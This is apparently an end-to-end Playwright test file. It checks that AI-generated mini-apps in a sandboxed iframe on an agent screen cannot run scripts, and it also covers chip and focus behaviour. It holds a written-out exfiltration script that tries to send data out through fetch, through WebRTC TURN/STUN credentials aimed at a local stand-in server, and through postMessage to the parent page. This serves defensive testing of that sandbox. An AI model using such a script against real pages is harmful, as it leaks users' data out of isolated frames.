"""Mini-apps on the Agent screen (spec agent-panel-code-mode, G7, Phase 5 and D14) against the running app.

Explorations and their mini-apps are seeded straight into the stack's store (no model call, no sandbox run). The frame
is `sandbox=""`, so nothing in it runs: a script put back into its srcdoc tries fetch to the app's API, WebRTC to a
TURN and a STUN server carrying the data, and messages to the screen, and none of it happens. Follow-up questions are
Ask chips outside the frame."""

import contextlib
import json
import os
import socket
import threading
import time
from pathlib import Path

import pytest

from arp.agent.explorations import ExplorationStore

URL = os.environ.get("ARP_E2E_URL")
API = os.environ.get("ARP_E2E_API_URL", "http://localhost:8000")  # the stack's API (e2e_stack.sh)
DSN = os.environ.get("ARP_POSTGRES_DSN", "postgresql+psycopg://arp:arp@localhost:5432/arp_test")  # e2e_stack.sh's default
LOGS = [Path(os.environ.get("TMPDIR", "/tmp")) / "arp-e2e" / name for name in ("api.log", "web.log")]  # e2e_stack.sh's
pytestmark = [
    pytest.mark.e2e,
    pytest.mark.skipif(not URL, reason="ARP_E2E_URL not set -- start backend/scripts/e2e_stack.sh"),
]

RESULT = [{"holding": "secret-co", "weight": 0.3}]
# What a mini-app script would try if one ran: the data out over fetch and WebRTC, and messages to the screen.
ESCAPE = """<script>
var d = JSON.stringify(%(data)s);
document.body.textContent = "script ran";
fetch("%(api)s/api/plans?d=" + encodeURIComponent(d));
var pc = new RTCPeerConnection({iceServers: [
  {urls: "turn:127.0.0.1:%(port)d?transport=udp", username: d, credential: "x"},
  {urls: "stun:127.0.0.1:%(port)d"}]});
pc.createDataChannel("x");
pc.createOffer().then(function (o) { return pc.setLocalDescription(o); });
parent.postMessage({action: "ask", text: "x"}, "*");
parent.postMessage({action: "run", plan_id: "x"}, "*");
</script>"""


@pytest.fixture
def page():
    from playwright.sync_api import sync_playwright

    from arp.config import Settings

    with sync_playwright() as p:
        browser = p.chromium.launch(executable_path=Settings().chromium_path)
        page = browser.new_page(viewport={"width": 1400, "height": 900})
        yield page
        browser.close()


@pytest.fixture
def udp():
    """A TURN/STUN server stand-in: records every packet that reaches it."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("127.0.0.1", 0))
    sock.settimeout(0.2)
    hits, stop = [], threading.Event()

    def serve():
        while not stop.is_set():
            with contextlib.suppress(TimeoutError):
                hits.append(sock.recvfrom(2048)[0])

    thread = threading.Thread(target=serve, daemon=True)
    thread.start()
    yield sock.getsockname()[1], hits
    stop.set()
    thread.join()
    sock.close()


def _seed(question, asks):
    store = ExplorationStore(DSN)
    row = store.add(question=question, code="return []", model="stand-in",
                    run={"status": "done", "result": RESULT, "error": None, "tool_calls": []})
    store.set_miniapp(row["id"], "<p>x</p>", asks)
    return row["id"]


def _open_miniapp(page, exploration):
    page.goto(f"{URL}/#/agent/exploration/{exploration}")
    page.get_by_role("tab", name="Mini-app").first.click()
    page.locator(".agent-stage iframe.agent-miniapp").wait_for()


def test_nothing_runs_in_the_frame_even_a_script_put_back(page, udp):  # AC-54c, AC-55, AC-55b, AC-55c, AC-57, AC-57b
    port, packets = udp
    _open_miniapp(page, _seed("miniapp isolation e2e", []))
    frame = page.locator(".agent-stage iframe.agent-miniapp")
    assert frame.get_attribute("sandbox") == ""
    seen = {log: log.stat().st_size for log in LOGS}  # the stack's access logs, read from the swap on
    script = ESCAPE % {"data": json.dumps(RESULT), "api": API, "port": port}
    frame.evaluate("(f, s) => { f.srcdoc = f.srcdoc.replace('</body>', s + '</body>'); }", script)
    time.sleep(5)

    assert "script ran" not in page.frame_locator(".agent-stage iframe.agent-miniapp").locator("body").inner_text()
    assert packets == []  # no TURN or STUN packet
    for log, start in seen.items():  # no request carrying the data reached the app
        with log.open("rb") as f:
            f.seek(start)
            assert b"secret-co" not in f.read(), log.name
    assert page.locator("#agent-brief").input_value() == ""  # neither message reached the screen


def test_an_ask_chip_fills_the_composer_in_ask_mode_and_sends_nothing(page):  # AC-54d, AC-56, AC-56b, AC-56c
    _open_miniapp(page, _seed("miniapp chips e2e", ["why sector X?"]))
    page.get_by_role("group", name="Mode").get_by_role("button", name="Plan").click()
    page.locator("#agent-brief").fill("old")
    assert page.frame_locator(".agent-stage iframe.agent-miniapp").get_by_text("why sector X?").count() == 0
    seen = {log: log.stat().st_size for log in LOGS}
    page.locator(".agent-stage").get_by_role("button", name="why sector X?").click()
    time.sleep(2)

    assert page.locator("#agent-brief").input_value() == "why sector X?"
    assert page.get_by_role("group", name="Mode").get_by_role("button", name="Ask").get_attribute("aria-pressed") == "true"
    for log, start in seen.items():
        with log.open("rb") as f:
            f.seek(start)
            sent = f.read()
        for route in (b"POST /api/agent/asks", b"POST /api/plans", b"POST /api/agent/explorations"):
            assert route not in sent, (log.name, route)


@pytest.fixture
def plain():
    """A done exploration without a mini-app yet."""
    return ExplorationStore(DSN).add(question="miniapp focus e2e", code="return []", model="stand-in",
                                     run={"status": "done", "result": [{"a": 1}], "error": None, "tool_calls": []})["id"]


def _answer_miniapp(page, exploration, ok):
    """The stack has no model: the route's answer is stored here, as the real route would, or it fails with 500."""
    def handle(route):
        if not ok:
            return route.fulfill(status=500, json={"detail": "no stand-in mini-app for test in miniapp.json"})
        row = ExplorationStore(DSN).set_miniapp(exploration, "<p>hi</p>", [])
        route.fulfill(status=200, content_type="application/json", body=json.dumps(row, default=str))
    page.route(f"**/api/agent/explorations/{exploration}/miniapp", handle)


@pytest.mark.parametrize("width", [1400, 390])
def test_show_as_miniapp_moves_focus_to_the_selected_miniapp_tab(page, plain, width):  # WCAG 2.4.3
    page.set_viewport_size({"width": width, "height": 900})
    _answer_miniapp(page, plain, ok=True)
    page.goto(f"{URL}/#/agent/exploration/{plain}")
    assert page.locator("#agent-show-miniapp").inner_text() == "Show as mini-app"  # AC-55e
    page.locator("#agent-show-miniapp").focus()
    page.keyboard.press("Enter")
    page.wait_for_function("document.activeElement && document.activeElement.dataset.tab === 'miniapp'", timeout=10_000)
    focused = page.evaluate("""() => { const e = document.activeElement;
        return {selected: e.getAttribute('aria-selected'), visible: !!e.offsetParent, inDrawer: !!e.closest('#agent-drawer')}; }""")
    assert focused == {"selected": "true", "visible": True, "inDrawer": width < 900}
    shown = page.frame_locator("dialog iframe.agent-miniapp" if width < 900 else ".agent-stage iframe.agent-miniapp")
    shown.locator("p").wait_for()  # the stored page shows in the stage that has focus
    assert page.locator("#agent-show-miniapp").inner_text() == "Regenerate mini-app"  # AC-55f


def test_closing_the_drawer_show_as_miniapp_opened_returns_focus_to_the_button(page, plain):  # WCAG 2.4.3, below 900 px
    page.set_viewport_size({"width": 390, "height": 844})
    _answer_miniapp(page, plain, ok=True)
    page.goto(f"{URL}/#/agent/exploration/{plain}")
    page.locator("#agent-show-miniapp").focus()
    page.keyboard.press("Enter")
    page.wait_for_function("document.activeElement && document.activeElement.dataset.tab === 'miniapp'", timeout=10_000)
    page.keyboard.press("Escape")
    page.wait_for_function("!document.querySelector('#agent-drawer')", timeout=5_000)
    assert page.evaluate("document.activeElement.id") == "agent-show-miniapp"


def test_a_failed_show_as_miniapp_returns_focus_to_the_button(page, plain):
    _answer_miniapp(page, plain, ok=False)
    page.goto(f"{URL}/#/agent/exploration/{plain}")
    page.locator("#agent-show-miniapp").focus()
    page.keyboard.press("Enter")
    page.get_by_role("alert").wait_for()
    page.wait_for_function("document.activeElement && document.activeElement.id === 'agent-show-miniapp'", timeout=10_000)
